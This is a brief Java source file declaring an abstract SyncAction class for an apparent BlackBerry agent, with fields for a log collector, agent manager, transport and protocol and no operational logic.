package blackberry.action;

import blackberry.AgentManager;
import blackberry.action.sync.Protocol;
import blackberry.action.sync.Transport;
import blackberry.log.LogCollector;

public abstract class SyncAction extends SubAction{        
    protected LogCollector logCollector;
    protected AgentManager agentManager;
   // protected Transport[] transports = new Transport[Transport.NUM];
    protected Transport transport;
    protected Protocol protocol;
    
    public SyncAction(int actionId) {
        super(actionId);
        logCollector = LogCollector.getInstance();
        agentManager = AgentManager.getInstance();
    }

}
